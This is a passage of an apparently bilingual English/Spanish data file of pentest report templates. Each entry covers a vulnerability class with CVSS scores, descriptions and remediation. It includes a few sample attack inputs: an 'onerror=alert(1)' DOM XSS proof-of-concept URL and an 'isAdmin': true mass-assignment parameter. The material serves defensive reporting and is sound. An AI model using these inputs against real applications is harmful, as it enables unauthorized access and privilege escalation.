      overview_es: 'Un atacante puede interferir con la forma en que una cadena de servidores HTTP procesa las solicitudes. Esto les permite "contrabandear" una solicitud maliciosa al servidor de back-end, que puede ser interpretada como una solicitud legítima de otro usuario.',
      technicalDescription_en: 'This vulnerability occurs when front-end (e.g., a load balancer) and back-end servers interpret the boundaries of HTTP requests differently, typically due to ambiguous `Content-Length` and `Transfer-Encoding` headers. An attacker can craft a single request that the front-end sees as one request but the back-end splits into two. The second, "smuggled" request is then prepended to the next user\'s legitimate request, leading to request hijacking.',
      technicalDescription_es: 'Esta vulnerabilidad ocurre cuando los servidores de front-end (p. ej., un balanceador de carga) y de back-end interpretan los límites de las solicitudes HTTP de manera diferente, generalmente debido a cabeceras `Content-Length` y `Transfer-Encoding` ambiguas. Un atacante puede crear una única solicitud que el front-end ve como una solicitud pero que el back-end divide en dos. La segunda solicitud, "contrabandeada", se antepone a la siguiente solicitud legítima del usuario, lo que lleva al secuestro de la solicitud.',
      affectedComponents_en: '[TODO Specify the affected application/URL. This is often infrastructure-wide.]',
      affectedComponents_es: '[TODO Especificar la aplicación/URL afectada. Esto a menudo afecta a toda la infraestructura.]',
      impact_en: 'HTTP Request Smuggling can be used to bypass security controls, gain unauthorized access to sensitive data, and hijack other users\' sessions. It is a critical vulnerability that can lead to a full compromise of the web application.',
      impact_es: 'El contrabando de solicitudes HTTP se puede utilizar para eludir los controles de seguridad, obtener acceso no autorizado a datos sensibles y secuestrar las sesiones de otros usuarios. Es una vulnerabilidad crítica que puede conducir a un compromiso total de la aplicación web.',
      recommendations_en: 'Ensure that the front-end and back-end servers use the same protocol (e.g., HTTP/2 throughout) and have consistent interpretations of request boundaries. Disable connection reuse on the back-end server if possible. Normalize ambiguous requests at the front-end.',
      recommendations_es: 'Asegurarse de que los servidores de front-end y back-end usen el mismo protocolo (p. ej., HTTP/2 en todo) y tengan interpretaciones consistentes de los límites de las solicitudes. Deshabilitar la reutilización de conexiones en el servidor de back-end si es posible. Normalizar las solicitudes ambiguas en el front-end.',
      details_en: '[TODO Provide a PoC request. This is highly technical and requires a tool like Burp Suite. Example: A CL.TE attack where Content-Length is used by the front-end and Transfer-Encoding by the back-end.]',
      details_es: '[TODO Proporcionar una solicitud de PoC. Esto es muy técnico y requiere una herramienta como Burp Suite. Ejemplo: Un ataque CL.TE donde el front-end usa Content-Length y el back-end usa Transfer-Encoding.]',
      remediation_en: {
          shortTerm: 'Configure the front-end proxy to normalize ambiguous requests, for example by removing one of the conflicting headers.',
          mediumTerm: 'Upgrade all network components to use HTTP/2, which is not vulnerable to this class of attack.',
          longTerm: 'Routinely test the infrastructure for request smuggling vulnerabilities using specialized tools.',
      },
      remediation_es: {
          shortTerm: 'Configurar el proxy de front-end para normalizar las solicitudes ambiguas, por ejemplo, eliminando una de las cabeceras conflictivas.',
          mediumTerm: 'Actualizar todos los componentes de la red para usar HTTP/2, que no es vulnerable a esta clase de ataque.',
          longTerm: 'Probar rutinariamente la infraestructura en busca de vulnerabilidades de contrabando de solicitudes utilizando herramientas especializadas.',
      },
      references: ['https://portswigger.net/web-security/request-smuggling'],
      tags: ['Request Smuggling', 'Infrastructure'],
  },
  {
      id: 'vuln-030',
      title_en: 'Mass Assignment',
      title_es: 'Asignación Masiva',
      cwe: 'CWE-915',
      severity: 'High',
      cvss: {
          score: 7.5,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'None',
          integrity: 'High',
          availability: 'None',
      },
      overview_en: 'An attacker can modify properties of an object that they are not supposed to be able to change. This occurs when the application framework automatically binds incoming HTTP request parameters to object properties without restriction.',
      overview_es: 'Un atacante puede modificar propiedades de un objeto que no debería poder cambiar. Esto ocurre cuando el framework de la aplicación vincula automáticamente los parámetros de solicitud HTTP entrantes a las propiedades del objeto sin restricciones.',
      technicalDescription_en: 'The application uses a feature that automatically maps request parameters to model properties. For example, when updating a user profile, a user might send `{"username": "new_name", "email": "new@email.com"}`. An attacker can add an extra parameter, such as `{"username": "new_name", "email": "new@email.com", "isAdmin": true}`. If the `isAdmin` property exists on the user model, the framework may automatically update it, granting the attacker administrative privileges.',
      technicalDescription_es: 'La aplicación utiliza una función que mapea automáticamente los parámetros de la solicitud a las propiedades del modelo. Por ejemplo, al actualizar un perfil de usuario, un usuario puede enviar `{"username": "new_name", "email": "new@email.com"}`. Un atacante puede agregar un parámetro adicional, como `{"username": "new_name", "email": "new@email.com", "isAdmin": true}`. Si la propiedad `isAdmin` existe en el modelo de usuario, el framework puede actualizarla automáticamente, otorgando al atacante privilegios administrativos.',
      affectedComponents_en: '[TODO Specify the vulnerable endpoint and object, e.g., The `/api/user/update` endpoint allows mass assignment on the User object.]',
      affectedComponents_es: '[TODO Especificar el endpoint y el objeto vulnerables, p. ej., El endpoint `/api/user/update` permite la asignación masiva en el objeto User.]',
      impact_en: 'Mass assignment can lead to privilege escalation, data tampering, and bypass of security controls.',
      impact_es: 'La asignación masiva puede conducir a la escalada de privilegios, la manipulación de datos y la elusión de los controles de seguridad.',
      recommendations_en: 'Avoid binding request parameters directly to objects. Instead, create a Data Transfer Object (DTO) with only the properties that are safe to be updated by the user. Explicitly map the fields from the DTO to the model object.',
      recommendations_es: 'Evitar vincular los parámetros de la solicitud directamente a los objetos. En su lugar, cree un Objeto de Transferencia de Datos (DTO) con solo las propiedades que son seguras para ser actualizadas por el usuario. Mapee explícitamente los campos del DTO al objeto del modelo.',
      details_en: '[TODO Provide the PoC request, showing the extra parameter being sent.]',
      details_es: '[TODO Proporcionar la solicitud de PoC, mostrando el parámetro adicional que se envía.]',
      remediation_en: {
          shortTerm: 'Configure the framework to use a whitelist of allowed fields for data binding on the affected models.',
          mediumTerm: 'Refactor the affected endpoints to use Data Transfer Objects (DTOs) instead of binding directly to domain models.',
          longTerm: 'Establish a coding standard that forbids direct model binding from external requests.',
      },
      remediation_es: {
          shortTerm: 'Configurar el framework para usar una lista blanca de campos permitidos para el enlace de datos en los modelos afectados.',
          mediumTerm: 'Refactorizar los endpoints afectados para usar Objetos de Transferencia de Datos (DTOs) en lugar de vincularse directamente a los modelos de dominio.',
          longTerm: 'Establecer un estándar de codificación que prohíba el enlace directo de modelos desde solicitudes externas.',
      },
      references: ['https://owasp.org/www-project-top-ten/2021/a03-injection'],
      tags: ['Mass Assignment', 'Injection'],
  },
  {
    id: 'vuln-031',
    title_en: 'Email Spoofing',
    title_es: 'Suplantación de Correo Electrónico (Email Spoofing)',
    cwe: 'CWE-347',
    severity: 'Medium',
    cvss: {
        score: 5.4,
        vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N',
        attackVector: 'Network',
        attackComplexity: 'Low',
        privilegesRequired: 'None',
        userInteraction: 'Required',
        scope: 'Unchanged',
        confidentiality: 'Low',
        integrity: 'Low',
        availability: 'None',
    },
    overview_en: 'The domain lacks proper email security configurations (SPF, DKIM, DMARC), allowing attackers to send emails that appear to come from the legitimate domain. This is commonly used in phishing attacks.',
    overview_es: 'El dominio carece de las configuraciones de seguridad de correo electrónico adecuadas (SPF, DKIM, DMARC), lo que permite a los atacantes enviar correos electrónicos que parecen provenir del dominio legítimo. Esto se usa comúnmente en ataques de phishing.',
    technicalDescription_en: 'The DNS records for the domain [TODO example.com] are missing or have a weak configuration for Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting, and Conformance (DMARC). This makes it trivial for an attacker to forge the "From" address in an email and impersonate the organization.',
    technicalDescription_es: 'Los registros DNS para el dominio [TODO example.com] faltan o tienen una configuración débil para Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM) y/o Domain-based Message Authentication, Reporting, and Conformance (DMARC). Esto hace que sea trivial para un atacante falsificar la dirección "De" en un correo electrónico y suplantar a la organización.',
    affectedComponents_en: 'The organization\'s email domain and overall brand reputation.',
    affectedComponents_es: 'El dominio de correo electrónico de la organización y la reputación general de la marca.',
    impact_en: 'Email spoofing is a key enabler for phishing, business email compromise (BEC), and malware distribution. It erodes trust in the brand and can lead to significant financial and data losses.',
    impact_es: 'La suplantación de correo electrónico es un habilitador clave para el phishing, el compromiso de correo electrónico empresarial (BEC) y la distribución de malware. Erosiona la confianza en la marca y puede provocar pérdidas financieras y de datos significativas.',
    recommendations_en: 'Implement strong SPF, DKIM, and DMARC records for the domain. Start with a DMARC policy of `p=none` to monitor for abuse, then gradually move to `p=quarantine` and finally `p=reject`.',
    recommendations_es: 'Implementar registros SPF, DKIM y DMARC fuertes para el dominio. Comenzar con una política DMARC de `p=none` para monitorear el abuso, luego pasar gradualmente a `p=quarantine` y finalmente a `p=reject`.',
    details_en: '[TODO Provide the output of a DNS query showing the missing or weak records.]',
    details_es: '[TODO Proporcionar la salida de una consulta DNS que muestre los registros faltantes o débiles.]',
    remediation_en: {
        shortTerm: 'Create and publish an SPF record listing all authorized mail-sending servers.',
        mediumTerm: 'Implement DKIM to cryptographically sign all outgoing emails. Create and publish a DMARC record in monitoring mode (`p=none`).',
        longTerm: 'Enforce the DMARC policy by moving to `p=quarantine` or `p=reject` after analyzing monitoring reports.',
    },
    remediation_es: {
        shortTerm: 'Crear y publicar un registro SPF que liste todos los servidores autorizados para enviar correo.',
        mediumTerm: 'Implementar DKIM para firmar criptográficamente todos los correos electrónicos salientes. Crear y publicar un registro DMARC en modo de monitoreo (`p=none`).',
        longTerm: 'Hacer cumplir la política DMARC pasando a `p=quarantine` o `p=reject` después de analizar los informes de monitoreo.',
    },
    references: ['https://dmarc.org/'],
    tags: ['Email', 'Spoofing', 'Phishing'],
  },
  {
      id: 'vuln-032',
      title_en: 'Username Enumeration',
      title_es: 'Enumeración de Nombres de Usuario',
      cwe: 'CWE-203',
      severity: 'Low',
      cvss: {
          score: 4.3,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'Low',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'An attacker can determine whether a username is valid based on the application\'s response. This allows an attacker to build a list of valid usernames to use in further attacks.',
      overview_es: 'Un atacante puede determinar si un nombre de usuario es válido basándose en la respuesta de la aplicación. Esto permite a un atacante construir una lista de nombres de usuario válidos para usar en ataques posteriores.',
      technicalDescription_en: 'The application provides different responses or behaves differently when a valid username is submitted versus an invalid one. This can happen on the login page, password reset form, or registration page. For example, a failed login for a valid user might return "Invalid password," while an invalid user returns "User not found."',
      technicalDescription_es: 'La aplicación proporciona diferentes respuestas o se comporta de manera diferente cuando se envía un nombre de usuario válido en comparación con uno no válido. Esto puede suceder en la página de inicio de sesión, el formulario de restablecimiento de contraseña o la página de registro. Por ejemplo, un inicio de sesión fallido para un usuario válido podría devolver "Contraseña no válida", mientras que un usuario no válido devuelve "Usuario no encontrado".',
      affectedComponents_en: '[TODO Specify the affected page, e.g., The password reset page at `/forgot-password`.]',
      affectedComponents_es: '[TODO Especificar la página afectada, p. ej., La página de restablecimiento de contraseña en `/forgot-password`.]',
      impact_en: 'Username enumeration simplifies brute-force and password-spraying attacks, as the attacker can focus their efforts on a known list of valid accounts.',
      impact_es: 'La enumeración de nombres de usuario simplifica los ataques de fuerza bruta y "password spraying", ya que el atacante puede centrar sus esfuerzos en una lista conocida de cuentas válidas.',
      recommendations_en: 'Ensure that the application always returns a generic, consistent response for both valid and invalid usernames on all public-facing pages (login, password reset, etc.).',
      recommendations_es: 'Asegurarse de que la aplicación siempre devuelva una respuesta genérica y consistente tanto para nombres de usuario válidos como no válidos en todas las páginas públicas (inicio de sesión, restablecimiento de contraseña, etc.).',
      details_en: '[TODO Provide screenshots showing the different responses for a valid and invalid user.]',
      details_es: '[TODO Proporcionar capturas de pantalla que muestren las diferentes respuestas para un usuario válido y uno no válido.]',

      remediation_en: {
          shortTerm: 'Standardize the error message on the affected forms to be generic, such as "Invalid username or password."',
          mediumTerm: 'Review all user-facing endpoints (login, registration, password reset) to ensure they do not leak information about account validity.',
          longTerm: 'Implement user enumeration protection at the WAF level if possible.',
      },
      remediation_es: {
          shortTerm: 'Estandarizar el mensaje de error en los formularios afectados para que sea genérico, como "Nombre de usuario o contraseña no válidos".',
          mediumTerm: 'Revisar todos los endpoints de cara al usuario (inicio de sesión, registro, restablecimiento de contraseña) para asegurarse de que no filtran información sobre la validez de la cuenta.',
          longTerm: 'Implementar protección contra la enumeración de usuarios a nivel de WAF si es posible.',
      },
      references: ['https://owasp.org/www-community/attacks/Credential_stuffing'],
      tags: ['Authentication', 'Enumeration'],
  },
  {
    id: 'vuln-033',
    title_en: 'DOM-based Cross-Site Scripting (XSS)',
    title_es: 'Cross-Site Scripting (XSS) Basado en DOM',
    cwe: 'CWE-79',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'Required',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can execute malicious scripts in a victim\'s browser. This vulnerability occurs entirely on the client-side when a script reads data from a controllable part of the DOM (e.g., the URL) and writes it back into the DOM in an unsafe way.',
    overview_es: 'Un atacante puede ejecutar scripts maliciosos en el navegador de una víctima. Esta vulnerabilidad ocurre completamente en el lado del cliente cuando un script lee datos de una parte controlable del DOM (p. ej., la URL) y los escribe de nuevo en el DOM de una manera insegura.',
    technicalDescription_en: 'The application\'s client-side JavaScript code takes data from a source (like `location.hash` or `document.referrer`) and passes it to a sink (like `innerHTML` or `document.write()`) without proper sanitization. An attacker can craft a URL that includes a malicious payload. When a victim visits this URL, the client-side script executes the payload.',
    technicalDescription_es: 'El código JavaScript del lado del cliente de la aplicación toma datos de una fuente (como `location.hash` o `document.referrer`) y los pasa a un "sink" (como `innerHTML` o `document.write()`) sin una sanitización adecuada. Un atacante puede crear una URL que incluya una carga útil maliciosa. Cuando una víctima visita esta URL, el script del lado del cliente ejecuta la carga útil.',
    affectedComponents_en: '[TODO Specify the vulnerable client-side script and the source/sink involved, e.g., A script on the homepage uses `location.hash` to populate a `div` element via `innerHTML`.]',
    affectedComponents_es: '[TODO Especificar el script vulnerable del lado del cliente y la fuente/"sink" involucrados, p. ej., Un script en la página de inicio usa `location.hash` para poblar un elemento `div` a través de `innerHTML`.]',
    impact_en: 'DOM-based XSS can be used to steal session cookies, perform actions on behalf of the user, or modify the content of the page. The impact is identical to other forms of XSS.',
    impact_es: 'El XSS basado en DOM se puede utilizar para robar cookies de sesión, realizar acciones en nombre del usuario o modificar el contenido de la página. El impacto es idéntico a otras formas de XSS.',
    recommendations_en: 'Avoid writing user-controllable data directly to the DOM. Use safe methods like `textContent` instead of `innerHTML`. When writing to the DOM is necessary, use a context-aware sanitization library like DOMPurify.',
    recommendations_es: 'Evitar escribir datos controlables por el usuario directamente en el DOM. Usar métodos seguros como `textContent` en lugar de `innerHTML`. Cuando sea necesario escribir en el DOM, utilice una librería de sanitización consciente del contexto como DOMPurify.',
    details_en: '[TODO Provide a PoC URL, e.g., `https://example.com/page.html#<img src=x onerror=alert(1)>`]',
    details_es: '[TODO Proporcionar una URL de PoC, p. ej., `https://example.com/page.html#<img src=x onerror=alert(1)>`]',
    remediation_en: {
      shortTerm: 'Replace unsafe sinks (like `innerHTML`) with safe alternatives (`textContent`) where possible.',
      mediumTerm: 'Implement DOMPurify to sanitize any HTML that must be written to the DOM from a user-controllable source.',
      longTerm: 'Conduct a full review of all client-side JavaScript to identify and remediate all potential DOM XSS vulnerabilities.',
    },
    remediation_es: {
      shortTerm: 'Reemplazar los "sinks" inseguros (como `innerHTML`) con alternativas seguras (`textContent`) donde sea posible.',
      mediumTerm: 'Implementar DOMPurify para sanitizar cualquier HTML que deba escribirse en el DOM desde una fuente controlable por el usuario.',
      longTerm: 'Realizar una revisión completa de todo el JavaScript del lado del cliente para identificar y remediar todas las posibles vulnerabilidades de DOM XSS.',
    },
    references: ['https://owasp.org/www-community/attacks/DOM_Based_XSS'],
    tags: ['XSS', 'DOM XSS'],
  },
  {
      id: 'vuln-034',
      title_en: 'Business Logic Flaw',
      title_es: 'Fallo en la Lógica de Negocio',
      cwe: 'CWE-840',
      severity: 'High',
      cvss: {
          score: 8.1,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'Low',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'None',
      },
      overview_en: 'An attacker can abuse the intended functionality of the application to achieve a malicious goal. This type of vulnerability stems from a flaw in the application\'s design and logic, rather than a standard coding error.',
      overview_es: 'Un atacante puede abusar de la funcionalidad prevista de la aplicación para lograr un objetivo malicioso. Este tipo de vulnerabilidad se origina en un fallo en el diseño y la lógica de la aplicación, en lugar de un error de codificación estándar.',
      technicalDescription_en: '[TODO Describe the specific business logic flaw. Example: A user can add a high-priced item to their cart, apply a coupon valid only for low-priced items, and then complete the checkout process, receiving the discount on the high-priced item.]',
      technicalDescription_es: '[TODO Describir el fallo específico de la lógica de negocio. Ejemplo: Un usuario puede agregar un artículo de alto precio a su carrito, aplicar un cupón válido solo para artículos de bajo precio y luego completar el proceso de compra, recibiendo el descuento en el artículo de alto precio.]',
      affectedComponents_en: '[TODO Specify the business process that is affected, e.g., The online shopping checkout process.]',
      affectedComponents_es: '[TODO Especificar el proceso de negocio que se ve afectado, p. ej., El proceso de compra en línea.]',
      impact_en: 'Business logic flaws can lead to direct financial loss, unauthorized access to features or content, and reputational damage. The impact is highly dependent on the specific flaw.',
      impact_es: 'Los fallos en la lógica de negocio pueden provocar pérdidas financieras directas, acceso no autorizado a funciones o contenido y daños a la reputación. El impacto depende en gran medida del fallo específico.',
      recommendations_en: 'Thoroughly review and test the application\'s business logic to identify and fix flaws. The logic should be designed to be resilient to manipulation and should explicitly validate all steps in a business process.',
      recommendations_es: 'Revisar y probar exhaustivamente la lógica de negocio de la aplicación para identificar y corregir fallos. La lógica debe diseñarse para ser resistente a la manipulación y debe validar explícitamente todos los pasos de un proceso de negocio.',
      details_en: '[TODO Provide a step-by-step PoC of how to exploit the flaw.]',
      details_es: '[TODO Proporcionar un PoC paso a paso de cómo explotar el fallo.]',
      remediation_en: {
          shortTerm: 'Implement a server-side check to validate the specific flawed logic (e.g., verify that a coupon is valid for all items in the cart).',
          mediumTerm: 'Conduct a threat modeling exercise focused on the application\'s business processes to identify other potential logic flaws.',
          longTerm: 'Integrate business logic test cases into the quality assurance process.',
      },
      remediation_es: {
          shortTerm: 'Implementar una verificación en el lado del servidor para validar la lógica defectuosa específica (p. ej., verificar que un cupón es válido para todos los artículos en el carrito).',
          mediumTerm: 'Realizar un ejercicio de modelado de amenazas centrado en los procesos de negocio de la aplicación para identificar otros posibles fallos lógicos.',
          longTerm: 'Integrar casos de prueba de lógica de negocio en el proceso de garantía de calidad.',
      },
      references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/'],
      tags: ['Business Logic'],
  },
  {
      id: 'vuln-035',
      title_en: 'Lack of Memory Safety',
      title_es: 'Falta de Seguridad de Memoria',
      cwe: 'CWE-119',
      severity: 'Critical',
      cvss: {
          score: 9.8,
          vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          attackVector: 'Network',
          attackComplexity: 'Low',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'High',
          integrity: 'High',
          availability: 'High',
      },
      overview_en: 'The application is written in a language that is not memory-safe (like C or C++) and contains vulnerabilities like buffer overflows or use-after-free, which can lead to arbitrary code execution.',
      overview_es: 'La aplicación está escrita en un lenguaje que no es seguro para la memoria (como C o C++) y contiene vulnerabilidades como desbordamientos de búfer o uso después de liberar, que pueden conducir a la ejecución de código arbitrario.',
      technicalDescription_en: 'The application has a memory corruption vulnerability. [TODO Be specific. Example: A `strcpy` function is used with a user-controlled input and a fixed-size buffer on the stack, leading to a classic stack-based buffer overflow.] An attacker can exploit this to overwrite the return address on the stack and redirect execution to shellcode.',
      technicalDescription_es: 'La aplicación tiene una vulnerabilidad de corrupción de memoria. [TODO Ser específico. Ejemplo: Se utiliza una función `strcpy` con una entrada controlada por el usuario y un búfer de tamaño fijo en la pila, lo que lleva a un desbordamiento de búfer clásico basado en la pila.] Un atacante puede explotar esto para sobrescribir la dirección de retorno en la pila y redirigir la ejecución al shellcode.',
      affectedComponents_en: '[TODO Specify the vulnerable function or code block.]',
      affectedComponents_es: '[TODO Especificar la función o bloque de código vulnerable.]',
      impact_en: 'Lack of memory safety can lead to remote code execution, giving an attacker full control over the process and potentially the entire system.',
      impact_es: 'La falta de seguridad de memoria puede conducir a la ejecución remota de código, otorgando a un atacante control total sobre el proceso y potencialmente todo el sistema.',
      recommendations_en: 'Rewrite the application in a memory-safe language (like Rust, Go, or Java). If that is not feasible, use safe library functions (e.g., `strncpy` instead of `strcpy`), and enable all compiler-level protections like Stack Canaries, ASLR, and DEP.',
      recommendations_es: 'Reescribir la aplicación en un lenguaje seguro para la memoria (como Rust, Go o Java). Si eso no es factible, use funciones de librería seguras (p. ej., `strncpy` en lugar de `strcpy`) y habilite todas las protecciones a nivel de compilador como Stack Canaries, ASLR y DEP.',
      details_en: '[TODO Provide a PoC exploit, often as a script written in Python using a library like `pwntools`.]',
      details_es: '[TODO Proporcionar un exploit de PoC, a menudo como un script escrito en Python usando una librería como `pwntools`.]',
      remediation_en: {
          shortTerm: 'Replace the unsafe function call with its safer alternative (e.g., `strcpy` -> `strncpy`). Recompile with all security flags enabled.',
          mediumTerm: 'Conduct a full source code review with a focus on memory management. Use static and dynamic analysis tools to find memory corruption bugs.',
          longTerm: 'Consider migrating critical components of the application to a memory-safe language.',
      },
      remediation_es: {
          shortTerm: 'Reemplazar la llamada a la función insegura con su alternativa más segura (p. ej., `strcpy` -> `strncpy`). Recompilar con todas las banderas de seguridad habilitadas.',
          mediumTerm: 'Realizar una revisión completa del código fuente con un enfoque en la gestión de la memoria. Usar herramientas de análisis estático y dinámico para encontrar errores de corrupción de memoria.',
          longTerm: 'Considerar la migración de componentes críticos de la aplicación a un lenguaje seguro para la memoria.',
      },
      references: ['https://cwe.mitre.org/data/definitions/119.html'],
      tags: ['Memory Corruption', 'Buffer Overflow'],
  },
  {
      id: 'vuln-036',
      title_en: 'Verbose Server Banners',
      title_es: 'Banners de Servidor Detallados',
      cwe: 'CWE-200',
      severity: 'Low',
      cvss: {
          score: 3.7,
          vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
          attackVector: 'Network',
          attackComplexity: 'High',
          privilegesRequired: 'None',
          userInteraction: 'None',
          scope: 'Unchanged',
          confidentiality: 'Low',
          integrity: 'None',
          availability: 'None',
      },
      overview_en: 'The server exposes detailed version information in its HTTP response headers (e.g., `Server: Apache/2.4.41 (Ubuntu)`). This information helps an attacker find known vulnerabilities for that specific version.',
      overview_es: 'El servidor expone información detallada de la versión en sus cabeceras de respuesta HTTP (p. ej., `Server: Apache/2.4.41 (Ubuntu)`). Esta información ayuda a un atacante a encontrar vulnerabilidades conocidas para esa versión específica.',
      technicalDescription_en: 'The web server, application framework, or other components are configured to include a `Server`, `X-Powered-By`, or other banner in HTTP responses. This banner contains the name and exact version number of the software.',
      technicalDescription_es: 'El servidor web, el framework de la aplicación u otros componentes están configurados para incluir un `Server`, `X-Powered-By` u otro banner en las respuestas HTTP. Este banner contiene el nombre y el número de versión exacto del software.',
      affectedComponents_en: 'HTTP responses from the main web server.',
      affectedComponents_es: 'Respuestas HTTP del servidor web principal.',
      impact_en: 'Exposing version information allows attackers to quickly and easily identify potentially vulnerable software, saving them time during the reconnaissance phase.',
      impact_es: 'La exposición de la información de la versión permite a los atacantes identificar rápida y fácilmente software potencialmente vulnerable, ahorrándoles tiempo durante la fase de reconocimiento.',
      recommendations_en: 'Configure the web server and application to suppress or obscure version information in all HTTP headers.',
      recommendations_es: 'Configurar el servidor web y la aplicación para suprimir u ofuscar la información de la versión en todas las cabeceras HTTP.',
      details_en: '[TODO Provide an HTTP response header that shows the verbose banner. e.g., `curl -I https://example.com`]',
      details_es: '[TODO Proporcionar una cabecera de respuesta HTTP que muestre el banner detallado. p. ej., `curl -I https://example.com`]',
      remediation_en: {
          shortTerm: 'Modify the web server configuration to hide the version banner (e.g., `ServerTokens Prod` in Apache).',
          mediumTerm: 'Remove all `X-Powered-By` headers and similar banners set by application frameworks.',
          longTerm: 'Implement a reverse proxy or WAF that can strip these headers from all outbound responses.',
      },
      remediation_es: {
          shortTerm: 'Modificar la configuración del servidor web para ocultar el banner de la versión (p. ej., `ServerTokens Prod` en Apache).',
          mediumTerm: 'Eliminar todas las cabeceras `X-Powered-By` y banners similares establecidos por los frameworks de aplicación.',
          longTerm: 'Implementar un proxy inverso o WAF que pueda eliminar estas cabeceras de todas las respuestas salientes.',
      },
      references: ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server'],
      tags: ['Information Disclosure', 'Fingerprinting'],
  },
  {
    id: 'vuln-037',
    title_en: 'Password Stored in Plaintext',
    title_es: 'Contraseña Almacenada en Texto Plano',
    cwe: 'CWE-256',
    severity: 'Critical',
    cvss: {
      score: 9.1,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'The application stores user passwords in plaintext in the database. If the database is compromised, all user passwords will be immediately exposed.',
    overview_es: 'La aplicación almacena las contraseñas de los usuarios en texto plano en la base de datos. Si la base de datos se ve comprometida, todas las contraseñas de los usuarios quedarán expuestas de inmediato.',
    technicalDescription_en: 'The application takes the user\'s password from the registration or password change form and inserts it directly into the database without any hashing. A database breach would allow an attacker to retrieve all user credentials in cleartext.',
    technicalDescription_es: 'La aplicación toma la contraseña del usuario del formulario de registro o cambio de contraseña y la inserta directamente en la base de datos sin ningún tipo de hashing. Una brecha en la base de datos permitiría a un atacante recuperar todas las credenciales de los usuarios en texto claro.',
    affectedComponents_en: 'The `users` table in the application database.',
    affectedComponents_es: 'La tabla `users` en la base de datos de la aplicación.',
    impact_en: 'In the event of a data breach, all user accounts are compromised. Since users often reuse passwords across different services, this can lead to the compromise of their accounts on other platforms as well.',
    impact_es: 'En caso de una brecha de datos, todas las cuentas de usuario se ven comprometidas. Dado que los usuarios a menudo reutilizan las contraseñas en diferentes servicios, esto también puede llevar al compromiso de sus cuentas en otras plataformas.',
    recommendations_en: 'Never store passwords in plaintext. Use a strong, salted, and adaptive password hashing algorithm like Argon2, scrypt, or bcrypt.',
    recommendations_es: 'Nunca almacenar contraseñas en texto plano. Utilice un algoritmo de hashing de contraseñas fuerte, con sal y adaptativo como Argon2, scrypt o bcrypt.',
    details_en: '[TODO Provide evidence, such as a screenshot of the database table showing a password in cleartext.]',
    details_es: '[TODO Proporcionar evidencia, como una captura de pantalla de la tabla de la base de datos que muestra una contraseña en texto claro.]',
    remediation_en: {
      shortTerm: 'Force a password reset for all users. During the reset process, hash the new passwords using a strong algorithm (e.g., bcrypt) before storing them.',
      mediumTerm: 'Identify and refactor all code paths that handle plaintext passwords to ensure they are never stored or logged.',
      longTerm: 'Implement a key management policy to protect any encryption keys used within the application.',
    },
    remediation_es: {
      shortTerm: 'Forzar un restablecimiento de contraseña para todos los usuarios. Durante el proceso de restablecimiento, hashear las nuevas contraseñas utilizando un algoritmo fuerte (p. ej., bcrypt) antes de almacenarlas.',
      mediumTerm: 'Identificar y refactorizar todas las rutas de código que manejan contraseñas en texto plano para asegurarse de que nunca se almacenen o registren.',
      longTerm: 'Implementar una política de gestión de claves para proteger cualquier clave de cifrado utilizada dentro de la aplicación.',
    },
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html'],
    tags: ['Cryptography', 'Passwords'],
  },
  {
    id: 'vuln-038',
    title_en: 'Insecure Transmission of Sensitive Data',
    title_es: 'Transmisión Insegura de Datos Sensibles',
    cwe: 'CWE-319',
    severity: 'High',
    cvss: {
      score: 7.4,
      vectorString: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N',
      attackVector: 'Network',
      attackComplexity: 'High',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'None',
    },
    overview_en: 'The application transmits sensitive data, such as credentials or session tokens, over an unencrypted channel (HTTP). An attacker in a position to eavesdrop on network traffic can intercept this data.',
    overview_es: 'La aplicación transmite datos sensibles, como credenciales o tokens de sesión, a través de un canal no cifrado (HTTP). Un atacante en posición de escuchar el tráfico de la red puede interceptar estos datos.',
    technicalDescription_en: 'The application\'s login form submits credentials over HTTP instead of HTTPS. An attacker on the same local network or at any point along the network path can use a packet sniffer (like Wireshark) to capture the POST request and read the username and password in cleartext.',
